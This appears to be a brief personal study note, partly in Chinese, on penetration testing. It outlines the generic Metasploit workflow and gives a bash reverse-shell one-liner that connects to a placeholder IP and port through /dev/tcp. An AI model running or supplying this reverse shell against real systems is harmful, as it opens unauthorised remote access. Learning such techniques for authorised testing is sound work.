# day one

```bash
msfconsole
search 关键字
use exploit
set parameter
run
```  

## 反弹shell

```bash
bash -i >& /dev/tcp/ip/端口 0>&1
```
